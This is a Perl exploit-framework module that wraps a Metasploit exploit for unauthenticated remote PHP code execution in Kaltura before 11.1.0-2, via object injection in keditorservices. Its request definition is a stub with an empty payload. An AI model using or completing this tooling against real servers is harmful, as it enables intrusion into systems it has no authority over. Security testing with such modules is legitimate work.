package KALTURA::MSF::KalturaUnserializeRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "KalturaUnserializeRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits an Object Injection vulnerability in Kaltura.

        By exploiting this vulnerability, unauthenticated users can execute

        arbitrary code under the context of the web server user.



        Kaltura has a module named keditorservices that takes user input

        and then uses it as an unserialized function parameter. The constructed

        object is based on the SektionEins Zend code execution POP chain PoC,

        with a minor modification to ensure Kaltura processes it and the

        Zend_Log function's __destruct() method is called. Kaltura versions

        prior to 11.1.0-2 are affected by this issue.



        This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.

      ",
  MSF_MODULE => "kaltura_unserialize_rce",
  PATHS => [""],
  TITLE => "Kaltura Remote PHP Code Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The target URI of the Kaltura installation",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
